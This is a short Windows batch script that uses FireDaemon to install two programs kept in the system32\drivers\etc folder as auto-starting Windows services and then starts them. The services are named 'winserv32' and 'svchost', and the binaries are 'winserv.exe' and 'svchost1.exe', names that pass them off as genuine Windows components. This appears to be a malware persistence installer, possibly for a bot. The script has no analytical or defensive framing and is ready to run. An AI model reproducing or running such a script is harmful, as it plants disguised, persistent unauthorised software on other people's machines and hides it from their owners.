@echo off
SET MXHOME=c:\windows\system32\drivers\etc
SET MXBIN=c:\windows\system32\drivers\etc
c:\windows\system32\drivers\etc\FireDaemon -i winserv32 "c:\windows\system32\drivers\etc" "c:\windows\system32\drivers\etc\winserv.exe" "ir.config" Y 0 0 0 Y
c:\windows\system32\drivers\etc\FireDaemon -i svchost "c:\windows\system32\drivers\etc" "c:\windows\system32\drivers\etc\svchost1.exe" "" Y 0 0 0 Y
net start winserv32	
net start svchost

